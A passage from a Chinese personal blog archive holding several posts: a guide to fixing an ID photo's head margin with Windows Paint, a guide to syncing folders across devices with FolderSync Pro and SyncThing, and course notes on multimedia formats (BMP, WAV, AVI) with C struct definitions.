<p>对了，对于生活区的文章，欢迎大家留言。尤其是喜欢互访小伙伴，欢迎你们在生活区文章中畅所欲言~</p>
<p>感谢各位小伙伴的支持~</p>
<blockquote>
<p>推荐文章：<a href="https://jack-vanlightly.com/blog/2022/1/25/write-for-others-but-mostly-for-yourself">Write for others but mostly for yourself — Jack Vanlightly (jack-vanlightly.com)</a></p>
</blockquote>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="1218172081" class="record">
            <header>
                <h1 class="record-title">图像采集头顶到顶部距离不通过？就用 Windows 自带的画图解决</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Windows');">Windows</button>
                    
                    <button class="btn" onclick="activeTag('画图');">画图</button>
                    
                    <button class="btn" onclick="activeTag('Win10');">Win10</button>
                    
                    <button class="btn" onclick="activeTag('图像采集');">图像采集</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>10/27/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20231027151358.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>用Windows自带软件简单调整图像的方法</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>489bd4b1</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>最近开始毕业大学生图像采集，为了节省排队时间，我选择自行上传电子照片完成采集。但是在上传相片时没通过检测（本文示例图片为胖虎，并非作者本人）：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231027144939.webp" alt="image.png"></p>
<p>小问题，PS 就能解决。但如果没有使用 PS 条件，我想到的两种低配方式：</p>
<ul>
<li>PPT。我愿称之为 PS、AI 的超级平替，很多简单操作 PPT 就能完成。</li>
<li>Windows 图画。最容易被忽略的软件，他也是我小时候画板的启蒙。</li>
</ul>
<p>第一种自己弄，这里介绍第二种方法。</p>
<h1>扩大画板</h1>
<p>在开始进行操作之前，先复制一份电子证件照，然后用 Windows 图像打开。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231027145854.webp" alt="image.png"></p>
<p>按住 <kbd>Ctrl</kbd> 键滑动滚轮，缩放视图。</p>
<p>拖动图画尺寸，腾出下移空间：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231027150054.webp" alt="image.png|325"></p>
<p>右侧尽量不要有白边，宽度小 1、2 个像素没事。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231027150219.webp" alt="image.png|325"></p>
<h1>人物下移</h1>
<p>全选图像：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231027150246.webp" alt="image.png"></p>
<p>按方向键下 <kbd>↓</kbd>，将图像下移：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231027150330.webp" alt="image.png|300"></p>
<p>可见上面就露出了白色空间。</p>
<h1>颜色填充</h1>
<p>这部分的白色空间，你可以用颜料桶取色填充：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231027150431.webp" alt="image.png"></p>
<p>也可以复制矩形选区进行填充：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231027150556.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231027150653.webp" alt="image.png|450"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231027150741.webp" alt="image.png|450"></p>
<p>覆盖白色区域后，保存即可：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231027150828.webp" alt="image.png|400"></p>
<h1>比例裁剪</h1>
<p>使用你平时浏览图片的工具进行编辑裁剪，调整为 3:4 比例。</p>
<p>这里我用 Windows 自带图片查看器演示：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231027150951.webp" alt="image.png|450"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231027151006.webp" alt="image.png|450"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231027151021.webp" alt="image.png|450"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231027151056.webp" alt="image.png|450"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231027151116.webp" alt="image.png|450"></p>
<h1>后记</h1>
<p>没错，我读的是 1 年水硕。有图为证：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231027151816.webp" alt="image.png|500"></p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="3437638411" class="record">
            <header>
                <h1 class="record-title">本地文件夹的多端同步</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('foldersync');">foldersync</button>
                    
                    <button class="btn" onclick="activeTag('SyncThing');">SyncThing</button>
                    
                    <button class="btn" onclick="activeTag('OneDrive');">OneDrive</button>
                    
                    <button class="btn" onclick="activeTag('Xmind');">Xmind</button>
                    
                    <button class="btn" onclick="activeTag('Obsidian');">Obsidian</button>
                    
                    <button class="btn" onclick="activeTag('实现');">实现</button>
                    
                    <button class="btn" onclick="activeTag('Android');">Android</button>
                    
                    <button class="btn" onclick="activeTag('Harmony');">Harmony</button>
                    
                    <button class="btn" onclick="activeTag('坚果云');">坚果云</button>
                    
                    <button class="btn" onclick="activeTag('null');">null</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>11/4/2023</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>实现Xmind思维导图的三端同步。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/synccoverasf.webp</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>cce6330b</span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!Notice] 文章重组提示<br>
本文由文章《多端同步 Xmind 思维导图》（于 2022 年 7 月 25 创作）增加新内容完善而来。原文章永久链接不变。</p>
</blockquote>
<p>这篇文章主要介绍本人亲测使用过本地多端文件夹同步方法，这些方法不需要花钱，但有一丢丢的技术成本。在决定阅读下面的方法前你可以先做以下方面的了解，确认它们是否能解决你的需求：</p>
<ul>
<li>百度网盘的「同步空间」功能</li>
<li>阿里云盘的「自动同步文件夹」功能</li>
<li>WPS/WPS 云盘提供的「文档云同步」和「同步文件夹」功能。「文档云同步」需要占用云盘空间，「同步文件夹」普通用户可设置 1 个，会员可设置 5 个。</li>
<li>Obsidian 笔记的官方同步方案。</li>
</ul>
<h1>Foldersync Pro</h1>
<p>Foldersync Pro 是一个手机端同步文件夹的应用程序。</p>
<p>软件特点：</p>
<ul>
<li>依托各大云盘接口进行文件夹同步。</li>
</ul>
<p>本实例使用到的软件：</p>
<ul>
<li>电脑端：以 OneDrive 为例</li>
<li>安卓（鸿蒙）端（手机/平板）：foldersync pro</li>
</ul>
<p>基本原理：</p>
<ul>
<li>电脑端上，在 Onedrive 创建文件夹（这个文件夹是 OneDrive 里的），里面放置需要实时同步的文件。</li>
<li>安卓端上，使用 foldersync pro 软件可以将手机的一个文件夹与 OneDrive 里的文件夹进行实时同步。</li>
</ul>
<p>foldersync pro 软件操作流程：</p>
<ul>
<li>在「账户」标签页中添加一个账户，选择 OneDrive 账户</li>
<li>根据提示进行账户验证，输入 OAUTH 代码</li>
<li>创建文件夹对，选择 OneDrive 账户</li>
<li>根据需要，设置同步类型、远程文件夹、本地文件夹即可</li>
<li>根据需要进行计划任务、同步选项等相应设置</li>
</ul>
<p>除了 OneDrive 外，Foldersync Pro 还支持许多账户类型、WebDAV 协议。国内可以通过这种方法使用坚果云账户进行同步，详看 <a href="https://help.jianguoyun.com/?p=2887">如何使用 FolderSync 在安卓手机上同步文件夹到坚果云？ | 坚果云帮助中心 (jianguoyun.com)</a>。</p>
<p>由于 OneDrive 传输大文件网速极慢，Foldersync 实时同步性较差，导致文件冲突难免发生。为此我转战到下一个软件 SyncThing。</p>
<h1>SyncThing</h1>
<p>软件特点：</p>
<ul>
<li>私密性强。数据只在端到端流转。传输内容加密。</li>
<li>使用时可以进行账户验证。</li>
<li>使用开放协议。软件 <a href="https://github.com/syncthing/syncthing">开源</a>。</li>
<li>支持 Android、MacOC、Windows 端</li>
</ul>
<p>本实例使用到的软件：</p>
<ul>
<li>电脑端：SyncThing</li>
<li>安卓（鸿蒙）端（手机/平板）：SyncThing</li>
</ul>
<p>基本原理：</p>
<ul>
<li>电脑端：选择添加文件夹，根据提示进行创建。手机或平板上安装好 SyncThing 时，电脑端添加一个设备。最后在设备选项选择需要共享的文件夹即可。</li>
<li>移动端：安装好软件后，可进行文件夹或设备管理。按提示操作即可。</li>
</ul>
<p>同步过程中注意暂停使用魔法。</p>
<p>官方手册：<a href="https://docs.syncthing.net/v1.25.0/intro/gui">An Intro to the GUI — Syncthing v1.25.0 documentation</a></p>
<h1>其他问题</h1>
<h2>我要同步 Xmind 文件夹</h2>
<p>使用移动端 Xmind 时软件会引导你指定一个文件夹是的 Xmind 拥有读写权限。接下来就可以直接使用了。如果你的 Xmind 来历不正规，记得取消它的联网权限，这样防止它总是弹出自动更新的提示框。</p>
<h2>我想同步 Obsidian 仓库</h2>
<p>如果不使用 Obsidian 官方同步方案，可以利用前面介绍的两款软件进行仓库的同步，照样能达到理想的效果。</p>
<h2>移动端防后台杀死进程</h2>
<p>为了保证文件同步进程不被杀死，需要赋予这些程序一定的权限，反正都试试。这里以华为鸿蒙 3 举例：</p>
<ul>
<li>关闭省点优化</li>
<li>后台进程加个小锁</li>
<li>“应用启动管理”中选择手动管理，并把三个选项都选上。（我认为最有用）</li>
</ul>
<h2>WPS 移动端并不能实时修改本地文件</h2>
<p>在本地打开文档时，使用 WPS 可以正常编辑和预览。但是 WPS 中做出的更改并不能实时更新到本地的文档中，导致同步软件检测不到文档的更改。</p>
<p>那为什么在资源管理器点击文档是可以看到先前的更改呢？WPS 将这些操作透明化了。在资源管理器点击文档后，WPS 自动打开到另一个文件夹中对应的文件，导致用户以为是本地的文件做出的更改。（这一点真的恶心死我了）</p>
<p>暂时的解决办法：手动「另存为」。</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://www.bilibili.com/video/BV1bu411k74U/?spm_id_from=888.80997.embed_other.whitelist">https://www.bilibili.com/video/BV1bu411k74U/?spm_id_from=888.80997.embed_other.whitelist</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3567162190">
                            <a href="#3567162190">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_有感而发);">⬤</span>
                                    
                                </span>
                                
                                <span>那一年的暑假剪影</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^Xmind]: 应该是这篇文章 <a href="#3437638411" title="本地文件夹的多端同步" class="record-link highlight">本地文件夹的多端同步</a>，不过现在的文章内容可能有改版和修正。</p>
<h1>day2 我对我所学专业的一点思考</h1>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="1813820909" class="record">
            <header>
                <h1 class="record-title">「多媒体与信号处理」课程笔记</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>嵌入式</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('嵌入式');">嵌入式</button>
                    
                    <button class="btn" onclick="activeTag('笔记');">笔记</button>
                    
                    <button class="btn" onclick="activeTag('多媒体');">多媒体</button>
                    
                    <button class="btn" onclick="activeTag('MP3');">MP3</button>
                    
                    <button class="btn" onclick="activeTag('AVC');">AVC</button>
                    
                    <button class="btn" onclick="activeTag('010编辑器');">010编辑器</button>
                    
                    <button class="btn" onclick="activeTag('JPEG');">JPEG</button>
                    
                    <button class="btn" onclick="activeTag('WAV');">WAV</button>
                    
                    <button class="btn" onclick="activeTag('AVI');">AVI</button>
                    
                    <button class="btn" onclick="activeTag('BMP');">BMP</button>
                    
                    <button class="btn" onclick="activeTag('DCT');">DCT</button>
                    
                    <button class="btn" onclick="activeTag('USTC');">USTC</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>11/22/2023</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>科软嵌入式必选课程笔记</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>6c1cb5ed</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/jshkcover.webp</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>笔记说明</h1>
<p>这是 USTC 软件学院 - 苏州 2023 秋季学期课程笔记（互联网版本）。本着藏着掖着发霉不如对外分享发光的精神，现将其公布。<a href="https://github.com/uuanqin/multimedia-signal-processing-notes">原本的笔记</a> 是卡片式的，为了便于互联网传播与收藏，现整合到同一篇文章当中。</p>
<p>这篇笔记的特点在于：</p>
<ul>
<li>有机涵盖 PPT 内容，精心编排，存在本人的理解消化过程</li>
<li>有重点标识、考点标识、实际考察标识</li>
<li>存在一些习题以供复习</li>
<li>部分图片为作者手工制作，便于知识的理解和掌握</li>
</ul>
<p>本笔记存在以下的符号定义：</p>
<ul>
<li>🔺表示老师经常在课上提，为考试重点。</li>
<li><span style="color:#ff0000">红色字体</span>为 <em>部分</em> 实际考察内容（指的是 2023 秋季学期考试）。</li>
</ul>
<p>本笔记的内容来源：</p>
<ul>
<li>主要来源：课程 PPT。注意，笔记的章节顺序是经过梳理调整的，顺序不一定与 PPT 讲授过程相符。</li>
<li>参考补充：<a href="https://blog.csdn.net/qq_39266065/article/details/106225637">秃头学长的笔记</a>，补充了一些练习题。</li>
</ul>
<p>笔记共分为 12 个章节。由于作者水平、精力与时间有限，「时频映射」的两个 Slices 以及「H.264」的 PPT 仅记录部分关键内容，内容也较粗糙（打上了「落叶🍂」标记）。由于当时考试不考「MP4」，所以笔记里也不包含这个章节。</p>
<p>临考前老师列出了多媒体信号处理课程知识点（详看 本课知识点 小节）。在后续的章节中这些知识点将以「考点」标注，如下示例：</p>
<blockquote>
<p>[!hint] 考点 X：[考点内容]</p>
</blockquote>
<p>如果你有以下需求：</p>
<ul>
<li>查看笔记源码</li>
<li>想导入到自己的双向笔记库中</li>
<li>习惯在 Github 上阅读</li>
<li>为笔记做贡献</li>
</ul>
<p>可以访问 <a href="https://github.com/uuanqin/USTC-SSE-multimedia-signal-processing-notes">本项目</a>：</p>
<p><a href="https://github.com/uuanqin/USTC-SSE-multimedia-signal-processing-notes"><img src="https://github-readme-stats.uuanqin.top/api/pin/?username=uuanqin&amp;repo=USTC-SSE-multimedia-signal-processing-notes" alt="Readme Card"></a></p>
<p>任何贡献都 Welcome！🎉🎉如果你有更新本笔记的想法（或者仅仅是纠错）可以通过邮件或评论区联系我！同时也期待你的 star~</p>
<hr>
<h1>导论（格式概览）</h1>
<p>什么是多媒体？包括文字、视频、静态图像、动画、交互内容。应用于广告、艺术、教育</p>
<p>什么是信号处理？</p>
<ul>
<li>系统工程、电子工程和应用数学领域</li>
<li>操作、分析模拟信号和数字信号</li>
<li>代表时空变化的物理量</li>
<li>典型的操作和应用：信号获取与重构、信号压缩、特征提取、质量提升（降噪，图像增强等）</li>
</ul>
<h2>🔺 数据压缩</h2>
<p>无损压缩：识别并消除统计冗余，无信息丢失</p>
<ul>
<li>LZW、Huffman coding（哈夫曼编码）、Arithmetic coding（算数编码）</li>
</ul>
<p>有损压缩：识别并移除不重要的信息</p>
<ul>
<li>Quantization（量化）、JPEG</li>
</ul>
<h2>数字容器格式 Digital Container Format</h2>
<blockquote>
<p>[!hint] 考点 1：音频、图像和视频的格式与容器</p>
</blockquote>
<p><strong>容器文件用做识别并交织不同数据形式。</strong></p>
<p>容器格式部件的不同名称：</p>
<ul>
<li>RIFF、PNG：chunks 块</li>
<li>QuickTime/MP4：atoms 原子</li>
<li>MPEG-TS：packets 包 （来自通信术语）</li>
<li>JPEG：段</li>
</ul>
<p>🎵 音频独有的容器：</p>
<ul>
<li>AIFF（IFF 文件格式，在 Mac OS 平台上广泛使用）</li>
<li>WAV（RIFF 文件格式，在 Windows 平台上广泛使用）</li>
<li>XMF（可扩展音乐格式）</li>
</ul>
<p>🖼 静态图像独有的容器：</p>
<ul>
<li><strong>TIFF</strong> (Tagged Image File Format，标记图像文件格式) 静止图像和关联的元数据。</li>
</ul>
<p>其他可以接纳多种音视频类型或其他媒体的容器：</p>
<ul>
<li><strong>3GP</strong> (在许多手机中使用；基于 ISO 基本媒体文件格式，是 MP4 的变种）</li>
<li><strong>ASF</strong>（Microsoft WMA 和 WMV 的容器）</li>
<li><strong>AVI</strong>（标准的 Microsoft Windows 容器）</li>
<li>Flash Video (<span style="color:#ff0000">FLV</span>, F4V) （来自 Adobe Systems 的视频和音频容器）</li>
<li>Matroska (MKV) （不限于任何编解码器或系统）</li>
<li>MJ2-Motion JPEG 2000 文件格式.</li>
<li><strong>QuickTime</strong> File Format（Apple 的标准 QuickTime 视频容器）</li>
<li>MPEG program stream (standard container for MPEG-1 and MPEG-2 elementary streams)</li>
<li>MPEG-2 transport stream (a.k.a. MPEG-TS) (standard container for digital broadcasting and for transportation over unreliable media; used also on Blu-ray Disc video)</li>
<li><strong>MP4</strong> (standard audio and video container for the MPEG-4 multimedia portfolio)</li>
<li>Ogg (standard container for <a href="http://Xiph.org">Xiph.org</a> audio format Vorbis and video format Theora)</li>
<li>RM (RealMedia; standard container for RealVideo and RealAudio)</li>
</ul>
<p>其他：SWF、RMVB</p>
<h2>音频格式 🎵</h2>
<p>非压缩的音频格式：WAVE、AIFF、Raw PCM</p>
<p>无损压缩格式：FLAC、<span style="color:#ff0000">Monkey’s audio (APE extension)</span>, Shorten, WMA Lossless</p>
<p>有损压缩格式：MP3, AAC, <strong>WMA</strong>, AC3</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231101184441.webp" alt="image.png|475"></p>
<h2>图像格式 🖼</h2>
<p>RAW、BMP、JPEG、JPEG2000、GIF、PNG</p>
<h2>视频格式 🎞</h2>
<p>MPEG-1、MPEG-2、MPEG-4 visual/AVC、H.261、H.263、H.264</p>
<ul>
<li>Advanced Video Coding（ISO）=H.264（ITO）</li>
</ul>
<blockquote>
<p>tea：H 开头一般和电信相关</p>
</blockquote>
<p>视频压缩标准的历史详看 视频编码 小节。</p>
<h1>BMP、WAV、AVI 格式</h1>
<h2>Windows Bitmap🖼</h2>
<h3>文件结构</h3>
<blockquote>
<p>[!hint] 考点 4：Windows Bitmap 文件结构</p>
</blockquote>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231104183213.webp" alt="image.png"></p>
<p>bfOffBits：是从位图文件头到位图数据的偏移量。即位图信息头 (BITMAPINFOHEADER)+ 全部颜色对照表 (RGBQUAD) 的字节数。</p>
<p>数据由代表位图的连续行或扫描线的字节值数组组成。每条扫描线由连续的字节组成，这些字节按从左到右的顺序代表扫描线中的像素。</p>
<p>代表扫描线的字节数取决于位图的宽度。</p>
<p><span style="color:#ff0000">扫描线以 32bit 为边界</span>，必须用 0 填充至末尾。</p>
<ul>
<li>这意味着宽度为 8 位，20 位或 30 位的单色位图将具有相同的扫描线大小：32 位</li>
<li>40 位宽的单色位图将具有 64 位的扫描线大小。</li>
</ul>
<p>Bitmap 中的扫描线是<strong>自底向上</strong>存的</p>
<ul>
<li>数组中的第一个字节代表 bitmap 左下角</li>
<li>数组中的最后一个字节代表 bitmap 右上角</li>
</ul>
<h3>位图种类</h3>
<h4>灰度位图</h4>
<ul>
<li>每个像素使用 <strong>8 个比特（1 字节）</strong>。Info Header 中的 biBitCount 将为 8。</li>
<li>每个字节代表 256 种灰度阴影。白色为 FF，黑色为 00</li>
<li>实质上是 8-bit 彩色位图的特例。存在一个颜色表，其中条目 0 指向黑色，条目 255 指向白色，而介于两者之间的条目指向灰色阴影。对于一个给定大小的图像来说，8-bit 灰度位图和 8-bit 彩色位图是一样的</li>
</ul>
<h4>24-Bit 彩色位图</h4>
<ul>
<li>每个像素使用 <strong>24 个比特（3 个字节）</strong>。Info Header 中的 biBitCount 将为 24。</li>
<li>每个像素 3 个字节代表红绿蓝。白色 FFFFFF，黑色 000000，红色 FF0000，绿色 00FF00，蓝色 0000FF</li>
</ul>
<h4>8-Bit 彩色位图</h4>
<ul>
<li>每个像素使用 8 个比特，只有 256 种颜色，通过调色板实现</li>
<li>颜色表在 info header 和 Data 之间，每一对含有 4 个字节（R, G, B, 0x0）</li>
</ul>
<p>颜色表：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231101184757.webp" alt="image.png|475"></p>
<h2>WAV 格式 🎵</h2>
<blockquote>
<p>[!hint] 考点 5：WAVE 格式</p>
</blockquote>
<blockquote>
<p>[!hint] 考点 8：列出一个块的组件</p>
</blockquote>
<p>WAV 是存储数字音频（waveform）的简单文件格式，使用了 RIFF 结构将文件内容分为不同的块（chunk）。</p>
<ul>
<li>每个块均由标头和数据字节组成。</li>
</ul>
<ul>
<li>Header 指定块数据字节的类型和大小。</li>
</ul>
<p>它支持各种 bit 分辨率、采样率和音频通道</p>
<p>流行于 Windows 平台，广泛应用于处理数字音频波形程序中</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231101184818.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231101184830.webp" alt="image.png"></p>
<p>所有使用 WAV 的应用必须能够读取两个必要块（fmt、data），并且可以有选择的忽略可选块。</p>
<p>程序复制一个 WAV，应该复制 WAV 中所有的块，即使有一些块最后不会被解释</p>
<p>次序要求：在 WAV 文件中，<strong>除了 Format 块必须在 Data 块前外</strong>，块的顺序没有限制</p>
<p>注意，format 块也许不是第一个块。一个 WAV 文件通常有三个 chunk 以及一个可选 chunk，其在文件中的排列方式依次是：</p>
<ol>
<li>RIFF chunk</li>
<li>Format chunk</li>
<li>Fact chunk（附加块，可选）</li>
<li>Data chunk</li>
</ol>
<p>所有的数据都以 8 位字节存储，以<strong>小端</strong>形式存于字节中</p>
<p>「块（的）数据」和「数据块」不是一个概念：<strong>数据块</strong>有「块大小」和一些「块数据」，其他所有块也是如此。</p>
<h3>组成</h3>
<p>WAV 组成：不同类型的 chunk 的集合。每个块包含头及数据，头指定了<strong>块数据</strong>的类型和大小，一些类型的块可能含有子块。<strong>RIFF 文件块必须以 2 个字节（1 word）对齐。</strong></p>
<h4>【必含】fmt 块</h4>
<p>fmt 块，采样格式，包含描述波形的参数，比如采样率、位分辨率和通道数</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231101185009.webp" alt="image.png"></p>
<pre><code class="language-C">typedef struct {
    ID chunkID;                 // 块的标识。总是「fmt 」注意末尾有空格。
    long chunkSize;             // 块的大小（除去chunkID、chunkSize）
    short wFormatTag;           // 存储数据时使用的压缩方法
    unsigned short wChannels;   // 音频的通道数。 1:单声道; 4:四通道
    unsigned long dwSamplesPerSec;  // 采样率。标准：44.1KHZ 48KHZ 32KHZ 22.05KHZ 96KHZ
    unsigned long dwAvgBytesPerSec; // 每秒播放多少字节，用于估计RAM需要的大小。
                                    // 其值应等于 dwSamplesPerSec * wBlockAlign的上取
    unsigned short wBlockAlign; // 采样帧的大小（字节）
							    // 其值等于 wChannels * (wBitsPerSample / 8) 的上取
								// 例如：
								// 3个未压缩的通道组成一个块，每个通道2个字节，则Block align=6
    unsigned short wBitsPerSample;   // 采样点的位分辨率
    unsigned short cbSize;      // Size of the extension，扩展字段的长度
    // 也许有额外的域, 取决于 wFormatTag
} FormatChunk;
</code></pre>
<table>
<thead>
<tr>
<th>🔺wFormatTag 值</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x0001</td>
<td>WAVE_FORMAT_PCM 未压缩的数据</td>
</tr>
<tr>
<td>0x0002</td>
<td>WAVE_FORMAT_ADPCM</td>
</tr>
<tr>
<td>0x0006</td>
<td>WAVE_FORMAT_ALAW （电话格式）</td>
</tr>
<tr>
<td>0x0007</td>
<td>WAVE_FORMAT_MULAW （电话格式）</td>
</tr>
<tr>
<td>0x55=85</td>
<td>WAVE_FORMAT_MP3</td>
</tr>
</tbody>
</table>
<h5>WAVEFORMATEXTENSIBLE 扩展的 WAVE 格式块</h5>
<pre><code class="language-C">typedef struct {
    WAVEFORMATEX Format;
    union {
        WORD wValidBitsPerSample; // 信号精度的比特数
							      // 假设使用24bit，但只前20位有效，则wValidBitsPerSample=20
        WORD wSamplesPerBlock; // 一个音频压缩块数据的样本数
        WORD wReserved;
    } Samples;
    DWORD dwChannelMask; // 指定流中通道到扬声器位置的分配的位掩码
    GUID SubFormat; // 对每一个波形数据类型定义的 ID。例如WMA中不同压缩方式。
} WAVEFORMATEXTENSIBLE
</code></pre>
<p>位掩码 dwChannelMask：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231101185109.webp" alt="image.png|500"></p>
<p><span style="color:#ff0000">用于超过 2 通道或 16 分辨率的音频数据</span>：</p>
<ul>
<li><code>wFormatTag</code> = FFFE（-2）</li>
<li><code>cbSize</code> = 24</li>
</ul>
<p>以 6 通道 5.1 格式为例子：</p>
<pre><code class="language-C">WAVEFORMATPCMEX waveFormatPCMEx;
// FormatChunk
wFormatTag = WAVE_FORMAT_EXTENSIBLE; //FFFE
wChannels = 6;
dwSamplesPerSec = 48000L;
dwAvgBytesPerSec = 864000L;          // nBlkAlign * nSamp/Sec = 18 * 48000 
wBlockAlign = 18;
wBitsPerSample = 24;                 // Container has 3 bytes
cbSize = 22;
// 以下是拓展的域
wValidBitsPerSample = 20;            // Top 20 bits have data
dwChannelMask = KSAUDIO_SPEAKER_5POINT1;
// SPEAKER_FRONT_LEFT | SPEAKER_FRONT_RIGHT |
// SPEAKER_FRONT_CENTER |SPEAKER_LOW_FREQUENCY |
// SPEAKER_BACK_LEFT | SPEAKER_BACK_RIGHT
SubFormat = KSDATAFORMAT_SUBTYPE_PCM; // Specify PCM
</code></pre>
<h4>【必含】data 块</h4>
<p>音频数据，包含实际波形数据，比如所有通道的数据波形</p>
<pre><code class="language-C">typedef struct {
    ID chunkID;
    long chunkSize;
    unsigned char waveformData[];
} DataChunk;
</code></pre>
<p>交错立体声波样本：多通道采样存储于交错的波形数据中；8bit 样本采用无符号数据表示，其他样本使用有符号数据表示。</p>
<p>对于多声道声音，每个声道的单个采样点是交错的。一组交错的采样点称为一个采样帧。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231101185123.webp" alt="image.png"></p>
<p>假设存在两个通路，先存放 time1 的左通道和右通道数据，再存放 time2，以此类推。</p>
<h4>其他</h4>
<p>fact 块（详见 音频编码基础 小节 的 ADPCM 章节）、cue 块</p>
<h2>AVI 格式 🎵🎞</h2>
<blockquote>
<p>[!hint] 考点 3：AVI 容器</p>
</blockquote>
<p>AVI 是另一种 RIFF，由微软开发</p>
<p>音视频交织，即视频段数据紧接音频数据。这允许媒体播放器<strong>以块来读数据而不是文件整体</strong>。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231101185135.webp" alt="image.png|475"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231101185202.webp" alt="image.png"></p>
<p>注意 AVI 是 Wave 格式，必须以两个字节（1 word）对齐，填充。解码时不需要考虑填充的数据。</p>
<p>索引目的：为了支持随机访问</p>
<blockquote>
<p>[!hint] 考点 6：解释 FOURCC 中 &quot;00dc&quot;，&quot;vids&quot; 等标签的意思</p>
</blockquote>
<p>🔺流列表中的四字节码：</p>
<ul>
<li><span style="color:#ff0000">vids：video stream</span></li>
<li>auds：audio stream</li>
<li>mp4v：MEPG4 visual</li>
</ul>
<p>数据块可以直接驻留在 movi 列表中，或者被 res 列表包围。</p>
<p>🔺FOURCC，定义块中信息的类型：</p>
<ul>
<li>db：未压缩的视频帧</li>
<li>d<strong>c</strong>：压缩的视频帧</li>
<li><span style="color:#ff0000">wb：音频流</span></li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231101185239.webp" alt="image.png"></p>
<blockquote>
<p>[!Example] 习题助记</p>
<ol>
<li>What does fourcc code “vids” stands for?</li>
<li>What does fourcc code “auds” stands for?</li>
<li>What does fourcc code “00db” stands for?</li>
<li>What does fourcc code “01wb” stands for?</li>
<li>ln which scemarops is wFormatTag equal to -2 in a WAVE file?<br>
音频通道大于 2，每一个抽样信号大于 16bit</li>
</ol>
</blockquote>
<h1>音频编码基础</h1>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102130537.webp" alt="image.png"></p>
<p>数字音频编码器：</p>
<ol>
<li>输入：模拟音频信号</li>
<li>编码器：转换为方便地数字形式</li>
<li>存储、处理、传输</li>
<li>解码器：将数字数据转换为模拟信号</li>
</ol>
<p>🔺音频编码目标：</p>
<ul>
<li>保真度：解码器尽量<strong>提高</strong>感知的音频质量，减少失真</li>
<li>数据率：减少代表原始音频信号的数据量</li>
<li>复杂性：减少计算复杂性</li>
<li>延迟：减少编码延迟</li>
</ul>
<h2>PCM——最简单的编码器</h2>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102130552.webp" alt="image.png|475"></p>
<p>量化是一种有损的过程。</p>
<p>在量化过程中使用的离散值数目越高，输出的信号越接近原始音频</p>
<h2>CD：Compact Disc 激光唱片</h2>
<blockquote>
